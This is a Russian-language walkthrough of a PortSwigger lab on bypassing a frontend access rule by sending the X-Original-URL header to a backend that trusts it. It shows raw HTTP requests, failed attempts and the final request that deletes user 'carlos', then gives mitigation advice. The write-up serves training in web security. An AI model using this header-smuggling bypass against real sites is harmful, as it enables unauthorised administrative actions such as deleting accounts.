#### рассогласованнось между фронтендом и бэкендом

ошибка в конфигурации URL запросов при использование заголовков 

X-Original-URL

пример - стоит такая защита
DENY: POST, /admin/deleteUser, managers

но вот так можно обойти
POST / HTTP/1.1 X-Original-URL: /admin/deleteUser


как работает:

- **фронтенд**: Видит `POST /` — "А, обычный запрос на главную, пропускаю". Он **не смотрит** на заголовок `X-Original-URL`, потому что его так настроили. Думает, что это какая-то внутренняя фигня для бэкенд
    
- **бэк**: Получает запрос и смотрит: "О, тут есть специальный заголовок `X-Original-URL: /admin/deleteUser`. Ага, значит пользователь реально хотел пойти сюда. Игнорируем пустой `/`, делаем то, что в заголовке"

то есть - это несогласованность в том как фронт и бек обрабатывают запросы

фронт блокирует  `POST /admin` 
фронт может пропустить безобидный `POST /` 
но и пропустить заголовок `X-Original-URL: /admin/deleteUser`

а разрабы решили, что защитили через фронт
но бек нативно может "в качестве фичи" парсить заголовок `X-Original-URL` и доверять слепо беку.... вот из-за такой несогласованности и происходит беда...
 
-----

лаба https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

задание: 
зайдите в панель администратора и удалите пользователя `carlos`

------

решаю лабу

есть такой урл

```http
https://0a54000c04d1bad18236795500b8008d.web-security-academy.net/admin
```

но доступа по нему нет

---

вот ориг запрос  к админке
```http
GET /admin HTTP/2
Host: 0a54000c04d1bad18236795500b8008d.web-security-academy.net
Cookie: session=A0sd8CJ3taRp5MPkH3xCzb6MoCBo8lRl
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a54000c04d1bad18236795500b8008d.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```


я тупо могу добавить 

X-Original-URL: /admin

вот так:

```http
GET / HTTP/2
Host: 0a54000c04d1bad18236795500b8008d.web-security-academy.net
Cookie: session=A0sd8CJ3taRp5MPkH3xCzb6MoCBo8lRl
X-Original-Url: /admin

...
..
.

Priority: u=0, i


```

и вот ответ:

```html
<a href="/admin">Admin panel</a>


<span>carlos - </span>
<a href="/admin/delete?username=carlos">Delete</a>
```

я получил доступ к админке
и получил пути для действий 

дергаю за     `/admin/delete?username=carlos`
но ответ 403
```http
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 15

"Access denied"
```


пробую и так
X-Original-Url: /admin/delete?username=carlos
и так 

GET /admin/delete?username=carlos HTTP/2
Host: 0a54000c04d1bad18236795500b8008d.web-security-academy.net
Cookie: session=A0sd8CJ3taRp5MPkH3xCzb6MoCBo8lRl
X-Original-Url: /admin/delete?username=carlos

и подобные варианты - везде блокировка!

-----


и вот наконец вот такой запрос сработал

```http
GET /delete?username=carlos HTTP/2
Host: 0a54000c04d1bad18236795500b8008d.web-security-academy.net
Cookie: session=A0sd8CJ3taRp5MPkH3xCzb6MoCBo8lRl
X-Original-Url: /admin/delete?
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
....
...
..
.
```

карлос удален и лаба решена!


#### вывод  

это  пример рассогласованности между фронтендом и бэкендом когда они по-разному понимают что есть настоящий url  
фронтенд блокирует прямой доступ к /admin но пропускает запрос на корень / а бэкенд смотрит на заголовок x-original-url и выполняет то что там написано  

в итоге защита работает только если атаковать напрямую, 
НО через обманку с заголовком она разваливается  

когда я пытался удалить карлоса напрямую через /admin/delete?username=carlos то получал 403 потому что фронтенд резал этот путь  

но когда я вынес урл удаления в параметры а в заголовок положил путь до админки с delete? то система скомбинировала это в рабочий запрос  

то есть бэкенд склеил урл из заголовка x-original-url и строки запроса и это сработало

некоторые фреймворки так делают - типо фича
#### защита  

не допускать ситуацию когда одни и те же правила по-разному реализованы на разных уровнях приложения  

если используешь заголовки типа x-original-url то убедись что фронтенд их вырезает или валидирует а не пропускает как есть 

бэкенд не должен слепо доверять таким заголовкам он обязан проверять права доступа для каждого эндпоинта независимо от того как пришёл запрос  

контроль доступа должен быть единым и работать на уровне приложения а не полагаться на то что фронтенд отсечёт плохие пути , везде должна быть согласованность!

все чувствительные операции - типа удаления юзера должны требовать дополнительной проверки прав даже если запрос пришёл из доверенной зоны